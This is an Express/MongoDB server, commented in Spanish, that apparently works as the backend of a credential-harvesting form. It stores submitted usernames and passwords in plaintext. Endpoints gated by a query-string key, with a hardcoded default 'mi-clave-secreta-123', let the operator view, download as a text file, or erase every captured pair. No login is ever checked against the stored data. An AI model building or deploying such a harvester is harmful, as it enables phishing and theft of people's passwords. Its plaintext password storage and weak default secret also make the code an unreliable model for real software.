const express = require('express');
const { MongoClient } = require('mongodb');
const path = require('path');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// Servir archivos estáticos
app.use(express.static(path.join(__dirname, 'public')));

// ========== CONFIGURACIÓN ==========
const SECRET_KEY = process.env.SECRET_KEY || 'mi-clave-secreta-123';
const MONGODB_URI = process.env.MONGODB_URI;
const DB_NAME = process.env.DB_NAME || 'formulario_db';
const COLLECTION_NAME = 'submissions';

// ========== LOG DE CONFIGURACIÓN (para debug) ==========
console.log('🔧 Configuración:');
console.log('  DB_NAME:', DB_NAME);
console.log('  MONGODB_URI definida:', MONGODB_URI ? 'SÍ' : 'NO');
console.log('  SECRET_KEY definida:', SECRET_KEY ? 'SÍ' : 'NO');

let collection = null;

// ========== CONEXIÓN A MONGODB ==========
async function connectDB() {
  if (!MONGODB_URI) {
    console.error('❌ ERROR: MONGODB_URI no está definida en las variables de entorno');
    console.error('   La app funcionará en modo DEMO (sin persistencia)');
    return false;
  }

  try {
    // Agregar opciones de conexión recomendadas
    const uri = MONGODB_URI.includes('?') 
      ? MONGODB_URI + '&retryWrites=true&w=majority' 
      : MONGODB_URI + '?retryWrites=true&w=majority';
    
    console.log('🔄 Intentando conectar a MongoDB Atlas...');
    
    const client = new MongoClient(uri, {
      serverSelectionTimeoutMS: 10000, // 10 segundos timeout
      connectTimeoutMS: 10000,
    });
    
    await client.connect();
    const db = client.db(DB_NAME);
    collection = db.collection(COLLECTION_NAME);
    
    console.log('✅ Conectado a MongoDB Atlas - DB:', DB_NAME);
    console.log('   Colección:', COLLECTION_NAME);
    return true;
  } catch (err) {
    console.error('❌ Error al conectar a MongoDB:', err.message);
    console.error('   La app funcionará en modo DEMO (sin persistencia)');
    return false;
  }
}

// ========== MIDDLEWARE: Verificar si MongoDB está disponible ==========
function requireDB(req, res, next) {
  if (!collection) {
    return res.status(503).json({ 
      success: false, 
      error: 'Base de datos no disponible. Intente más tarde.' 
    });
  }
  next();
}

// ========== API: GUARDAR REGISTRO ==========
app.post('/api/submit', async (req, res) => {
  try {
    const { usuario, password } = req.body;
    
    const doc = {
      usuario: usuario || '(vacío)',
      password: password || '(vacío)',
      fecha: new Date()
    };
    
    // Si no hay MongoDB, guardar en memoria temporal
    if (!collection) {
      console.log('⚠️ MongoDB no disponible. Registro perdido:', doc);
      return res.status(503).json({ 
        success: false, 
        error: 'Base de datos no disponible. Contacte al administrador.' 
      });
    }
    
    await collection.insertOne(doc);
    console.log('✅ Registro guardado en MongoDB:', doc.usuario);
    res.json({ success: true, message: 'Registro guardado correctamente' });
  } catch (err) {
    console.error('Error al guardar:', err);
    res.status(500).json({ success: false, error: 'Error al guardar en la base de datos' });
  }
});

// ========== VER REGISTROS EN TEXTO PLANO ==========
app.get('/submissions.txt', async (req, res) => {
  const key = req.query.key;
  if (key !== SECRET_KEY) {
    return res.status(403).send('⛔ ACCESO DENEGADO\n\nSe requiere una clave válida.\nEjemplo: /submissions.txt?key=TU_CLAVE');
  }
  
  try {
    if (!collection) {
      return res.status(503).send('Base de datos no disponible.');
    }
    
    const docs = await collection.find({}).sort({ fecha: 1 }).toArray();
    
    if (docs.length === 0) {
      return res.status(404).send('No hay registros aún.');
    }
    
    let content = '=== REGISTROS DEL FORMULARIO ===\n';
    content += `Generado: ${new Date().toLocaleString('es-ES')}\n`;
    content += `Total: ${docs.length}\n================================\n\n`;
    
    docs.forEach((doc, index) => {
      const fecha = doc.fecha ? new Date(doc.fecha).toLocaleString('es-ES') : 'Sin fecha';
      content += `Registro #${index + 1}\n`;
      content += `  Usuario:  ${doc.usuario}\n`;
      content += `  Password: ${doc.password}\n`;
      content += `  Fecha:    ${fecha}\n`;
      content += '--------------------------------\n';
    });
    
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.send(content);
  } catch (err) {
    console.error('Error al leer:', err);
    res.status(500).send('Error al leer la base de datos');
  }
});

// ========== DESCARGAR ARCHIVO .txt ==========
app.get('/api/download', async (req, res) => {
  const key = req.query.key;
  if (key !== SECRET_KEY) {
    return res.status(403).json({ error: 'Clave incorrecta' });
  }
  
  try {
    if (!collection) {
      return res.status(503).json({ error: 'Base de datos no disponible' });
    }
    
    const docs = await collection.find({}).sort({ fecha: 1 }).toArray();
    
    let content = '=== REGISTROS DEL FORMULARIO ===\n';
    content += `Generado: ${new Date().toLocaleString('es-ES')}\n`;
    content += `Total: ${docs.length}\n================================\n\n`;
    
    docs.forEach((doc, index) => {
      const fecha = doc.fecha ? new Date(doc.fecha).toLocaleString('es-ES') : 'Sin fecha';
      content += `Registro #${index + 1}\n`;
      content += `  Usuario:  ${doc.usuario}\n`;
      content += `  Password: ${doc.password}\n`;
      content += `  Fecha:    ${fecha}\n`;
      content += '--------------------------------\n';
    });
    
    res.setHeader('Content-Disposition', 'attachment; filename="todos_los_registros.txt"');
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.send(content);
  } catch (err) {
    console.error('Error al descargar:', err);
    res.status(500).json({ error: 'Error al generar el archivo' });
  }
});

// ========== LIMPIAR / REINICIAR REGISTROS ==========
app.get('/api/clear', async (req, res) => {
  const key = req.query.key;
  if (key !== SECRET_KEY) {
    return res.status(403).send('⛔ ACCESO DENEGADO. Clave incorrecta.');
  }
  
  try {
    if (!collection) {
      return res.status(503).json({ success: false, error: 'Base de datos no disponible' });
    }
    
    const result = await collection.deleteMany({});
    res.json({ 
      success: true, 
      message: 'Registros limpiados correctamente',
      eliminados: result.deletedCount 
    });
  } catch (err) {
    console.error('Error al limpiar:', err);
    res.status(500).json({ success: false, error: 'Error al limpiar la base de datos' });
  }
});

// ========== HEALTH CHECK ==========
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    mongodb: collection ? 'connected' : 'disconnected',
    timestamp: new Date().toISOString()
  });
});

// ========== INICIAR SERVIDOR (SIEMPRE, independiente de MongoDB) ==========
const PORT = process.env.PORT || 3000;

// Iniciar servidor HTTP INMEDIATAMENTE
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ Servidor HTTP corriendo en puerto ${PORT}`);
});

// Luego intentar conectar a MongoDB (no bloquea el servidor)
connectDB().then(connected => {
  if (connected) {
    console.log('🚀 App lista con MongoDB');
  } else {
    console.log('⚠️ App lista en modo DEMO (sin MongoDB)');
  }
});